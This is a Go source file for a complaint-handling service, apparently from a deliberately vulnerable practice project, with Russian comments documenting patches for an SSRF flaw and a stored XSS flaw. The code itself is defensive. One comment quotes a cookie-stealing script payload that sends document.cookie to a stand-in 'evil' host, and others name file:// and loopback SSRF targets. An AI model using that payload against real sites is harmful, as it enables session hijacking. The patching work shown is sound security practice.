package usecase

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/microcosm-cc/bluemonday"
	logkit "github.com/wahrwelt-kit/go-logkit"

	"github.com/TakuyaYagam1/iustitia/internal/apperr"
	"github.com/TakuyaYagam1/iustitia/internal/domain"
	"github.com/TakuyaYagam1/iustitia/internal/repo"
	sqlc "github.com/TakuyaYagam1/iustitia/internal/repo/sqlc"
)

const maxEvidenceBytes = 5 << 20

// bluemondayUGC - один инстанс policy на пакет; UGCPolicy безопасен для
// конкурентных Sanitize-вызовов (документировано в bluemonday README).
var bluemondayUGC = bluemonday.UGCPolicy()

type Complaint struct {
	store      repo.Store
	logger     logkit.Logger
	evidenceHC *http.Client
}

// PATCH - Vuln 6 (SSRF via evidence URL).
// Было: в HTTP-клиент регистрировался file://-transport через
// http.NewFileTransport(http.Dir("/")), плюс не проверялись scheme/host.
// Это позволяло:
//   - file:///abs/path/secrets/internal.txt -> читать любой файл сервера,
//     включая SECRET_MARKER_S;
//   - http://127.0.0.1:<порт>/ -> дергать внутренние админ-эндпоинты.
//
// Стало: собственный http.Client БЕЗ file-транспорта. Диалер через Control
// хук получает IP хоста ПОСЛЕ резолва и отвергает петлевые, линк-локал,
// приватные и multicast-диапазоны - прикрывает и DNS-rebinding (проверка
// на resolved IP, а не на имя до резолва).
func NewComplaint(store repo.Store, logger logkit.Logger) *Complaint {
	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 30 * time.Second,
		Control:   controlRejectPrivate,
	}
	tr := &http.Transport{
		DialContext:           dialer.DialContext,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		DisableKeepAlives:     true,
	}
	return &Complaint{
		store:  store,
		logger: logger,
		evidenceHC: &http.Client{
			Transport: tr,
			Timeout:   10 * time.Second,
		},
	}
}

func controlRejectPrivate(_, address string, _ syscall.RawConn) error {
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return fmt.Errorf("Complaint - dial control - SplitHostPort: %w", err)
	}
	ip := net.ParseIP(host)
	if ip == nil {
		return fmt.Errorf("Complaint - dial control - non-IP host after resolve: %q", host)
	}
	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() || ip.IsMulticast() || ip.IsUnspecified() {
		return fmt.Errorf("Complaint - dial control - forbidden IP range: %s", ip)
	}
	return nil
}

// PATCH - Vuln 1 (Stored XSS через текст жалобы).
// Было: текст жалобы сохранялся как есть; фронт рендерил его через
// innerHTML/dangerouslySetInnerHTML - атакующий писал
//
//	<script>fetch('//evil/?'+document.cookie)</script>
//
// и забирал сессию judge'а при просмотре дела.
// Стало: bluemonday UGCPolicy - стандартная политика для форумного
// контента. Пропускает p/b/i/a/ul/li/blockquote, блочит <script>,
// <iframe>, on*-атрибуты и javascript:-URL. После санитизации
// отсекаем пустую строку (атакующий не может протолкнуть "чистый"
// <script>… -> "" -> BAD_REQUEST).
func (u *Complaint) Create(ctx context.Context, caseID, authorID uuid.UUID, text string) (*domain.Complaint, error) {
	if text == "" {
		return nil, apperr.ErrBadRequest
	}
	sanitized := strings.TrimSpace(bluemondayUGC.Sanitize(text))
	if sanitized == "" {
		return nil, apperr.ErrBadRequest
	}

	id := uuid.New()
	row, err := u.store.CreateComplaint(ctx, sqlc.CreateComplaintParams{
		ID:       id.String(),
		CaseID:   caseID.String(),
		AuthorID: authorID.String(),
		Text:     sanitized,
	})
	if err != nil {
		return nil, fmt.Errorf("Complaint - Create - store.CreateComplaint: %w", err)
	}
	return complaintFromRow(row)
}

func (u *Complaint) AttachEvidence(ctx context.Context, complaintID uuid.UUID, rawURL string) (*domain.Complaint, error) {
	if rawURL == "" {
		return nil, apperr.ErrBadRequest
	}

	// PATCH - Vuln 6 (SSRF via evidence URL).
	// Первая линия обороны: парсим URL и принимаем только http(s). Это
	// режет сразу file://, gopher://, ftp:// и т.п. Вторая линия - в
	// controlRejectPrivate на диалере (см. NewComplaint).
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, apperr.ErrBadRequest
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, apperr.ErrBadRequest
	}
	if parsed.Host == "" {
		return nil, apperr.ErrBadRequest
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return nil, fmt.Errorf("Complaint - AttachEvidence - NewRequest: %w", err)
	}
	resp, err := u.evidenceHC.Do(req)
	if err != nil {
		return nil, fmt.Errorf("Complaint - AttachEvidence - Do: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxEvidenceBytes))
	if err != nil {
		return nil, fmt.Errorf("Complaint - AttachEvidence - ReadAll: %w", err)
	}

	urlCopy := rawURL
	dataCopy := string(body)
	row, err := u.store.UpdateComplaintEvidence(ctx, sqlc.UpdateComplaintEvidenceParams{
		EvidenceUrl:  &urlCopy,
		EvidenceData: &dataCopy,
		ID:           complaintID.String(),
	})
	if err != nil {
		return nil, fmt.Errorf("Complaint - AttachEvidence - store.UpdateComplaintEvidence: %w", err)
	}
	return complaintFromRow(row)
}

func (u *Complaint) ListByCase(ctx context.Context, caseID uuid.UUID) ([]*domain.Complaint, error) {
	rows, err := u.store.ListComplaintsByCase(ctx, caseID.String())
	if err != nil {
		return nil, fmt.Errorf("Complaint - ListByCase - store.ListComplaintsByCase: %w", err)
	}
	out := make([]*domain.Complaint, 0, len(rows))
	for _, row := range rows {
		c, err := complaintFromRow(row)
		if err != nil {
			return nil, fmt.Errorf("Complaint - ListByCase - complaintFromRow: %w", err)
		}
		out = append(out, c)
	}
	return out, nil
}

func complaintFromRow(r sqlc.Complaint) (*domain.Complaint, error) {
	id, err := uuid.Parse(r.ID)
	if err != nil {
		return nil, errors.New("usecase - complaintFromRow - malformed id")
	}
	caseID, err := uuid.Parse(r.CaseID)
	if err != nil {
		return nil, errors.New("usecase - complaintFromRow - malformed case_id")
	}
	authorID, err := uuid.Parse(r.AuthorID)
	if err != nil {
		return nil, errors.New("usecase - complaintFromRow - malformed author_id")
	}
	return &domain.Complaint{
		ID:           id,
		CaseID:       caseID,
		AuthorID:     authorID,
		Text:         r.Text,
		EvidenceURL:  r.EvidenceUrl,
		EvidenceData: r.EvidenceData,
		CreatedAt:    r.CreatedAt,
	}, nil
}
